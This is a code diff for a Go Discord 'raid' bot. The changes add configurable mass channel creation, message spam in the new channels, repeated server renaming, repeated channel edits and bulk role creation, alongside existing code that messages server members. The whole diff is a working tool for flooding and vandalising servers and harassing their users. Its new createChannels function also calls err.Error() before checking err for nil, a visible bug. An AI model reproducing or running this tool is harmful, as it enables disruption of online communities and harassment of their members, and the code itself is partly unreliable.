@@ -22,15 +22,27 @@ type Config struct {
 		} `yaml:"status"`
 
 		Raid struct {
-			Messages         []string `yaml:"messages"`
-			MessageDelay     int      `yaml:"messageDelay"`
-			GuildEditDelay   int      `yaml:"guildEditDelay"`
-			ChannelEditDelay int      `yaml:"channelEditDelay"`
-			ChannelAmount    int      `yaml:"channelAmount"`
-			Channels         struct {
-				Name   string `yaml:"name"`
-				Amount int    `yaml:"amount"`
+			Messages     []string `yaml:"messages"`
+			MessageDelay int      `yaml:"messageDelay"`
+			GuildEdit    struct {
+				Enable bool     `yaml:"enable"`
+				Names  []string `yaml:"names"`
+				Delay  int      `yaml:"delay"`
+			} `yaml:"guildEdit"`
+			Channels struct {
+				Names  []string `yaml:"names"`
+				Amount int      `yaml:"amount"`
+				Edit   struct {
+					Enable bool `yaml:"enable"`
+					Delay  int  `yaml:"delay"`
+				} `yaml:"edit"`
 			} `yaml:"channels"`
+			Roles struct {
+				Enable bool     `yaml:"enable"`
+				Names  []string `yaml:"names"`
+				Amount int      `yaml:"amount"`
+				Delay  int      `yaml:"delay"`
+			} `yaml:"roles"`
 		} `yaml:"raid"`
 	} `yaml:"bot"`
 }
@@ -168,7 +180,13 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 		go createChnlMsgs(m.GuildID, s)
 
-		go spamGuildEdit(m.GuildID, s)
+		if config.Bot.Raid.GuildEdit.Enable == true {
+			go spamGuildEdit(m.GuildID, s)
+		}
+
+		if config.Bot.Raid.Roles.Enable == true {
+			go spamRoleCreate(m.GuildID, s)
+		}
 
 		members, err := s.GuildMembers(m.GuildID, "", 1000)
 
@@ -204,36 +222,20 @@ func sendMsgToMembers(userChannel *discordgo.Channel, s *discordgo.Session) {
 }
 
 func createChnlMsgs(gid string, s *discordgo.Session) {
-	var channelIDs []string
-
 	amount := config.Bot.Raid.Channels.Amount
-	chName := config.Bot.Raid.Channels.Name
-
-	if chName == "" {
-		chName = "raid-go"
-	}
 
 	fmt.Printf("Creating %d channels\n", amount)
 
-	for i := 0; i < amount; i++ {
-		channel, err := s.GuildChannelCreate(gid, chName, 0)
-
-		fmt.Printf("")
-
-		if err != nil {
-			println("fail creating channel")
-			return
-		}
-
-		channelIDs = append(channelIDs, channel.ID)
-
-	}
+	channels := createChannels(gid, s)
 
 	fmt.Printf("Done creating %d channels. Starting to spam messages to the channels.\n", amount)
 
-	for _, ch := range channelIDs {
+	for _, ch := range channels {
 		go spamMessages(ch, s)
 
+		if config.Bot.Raid.Channels.Edit.Enable == true {
+			go spamChannelEdit(ch, s)
+		}
 	}
 }
 
@@ -255,17 +257,62 @@ func spamMessages(channelID string, s *discordgo.Session) {
 	}
 }
 
+func createChannels(gid string, s *discordgo.Session) (channelIDs []string) {
+	channelNames := config.Bot.Raid.Channels.Names
+	amount := config.Bot.Raid.Channels.Amount
+
+	var ids []string
+
+	for i := 0; i < amount; i++ {
+		randomIndex := rand.Intn(len(channelNames))
+		channel, err := s.GuildChannelCreate(gid, channelNames[randomIndex], 0)
+
+		fmt.Printf("")
+
+		println(err.Error())
+
+		if err != nil {
+			println("fail creating channel")
+		} else {
+			ids = append(ids, channel.ID)
+		}
+	}
+
+	return ids
+}
+
+func spamRoleCreate(gid string, s *discordgo.Session) {
+	roleNames := config.Bot.Raid.Roles.Names
+	amount := config.Bot.Raid.Roles.Amount
+
+	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Roles.Delay) * time.Millisecond)
+
+	for i := 0; i < amount; i++ {
+		select {
+		case <-editTicker.C:
+			println("(TICK) Creating new role")
+			randomIndex := rand.Intn(len(roleNames))
+			_, err := s.GuildRoleCreate(gid, &discordgo.RoleParams{
+				Name: roleNames[randomIndex],
+			})
+
+			if err != nil {
+				println("error creating new role for gid " + gid)
+			}
+		}
+	}
+}
 func spamGuildEdit(gid string, s *discordgo.Session) {
-	messages := config.Bot.Raid.Messages
-	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.GuildEditDelay) * time.Millisecond)
+	names := config.Bot.Raid.GuildEdit.Names
+	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.GuildEdit.Delay) * time.Millisecond)
 
 	for {
 		select {
 		case <-editTicker.C:
 			println("(TICK) Changing guild name")
-			randomIndex := rand.Intn(len(messages))
+			randomIndex := rand.Intn(len(names))
 			_, err := s.GuildEdit(gid, &discordgo.GuildParams{
-				Name: messages[randomIndex],
+				Name: names[randomIndex],
 			})
 
 			if err != nil {
@@ -277,7 +324,7 @@ func spamGuildEdit(gid string, s *discordgo.Session) {
 
 func spamChannelEdit(channelID string, s *discordgo.Session) {
 	messages := config.Bot.Raid.Messages
-	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.ChannelEditDelay) * time.Millisecond)
+	editTicker := time.NewTicker(time.Duration(config.Bot.Raid.Channels.Edit.Delay) * time.Millisecond)
 
 	for {
 		select {
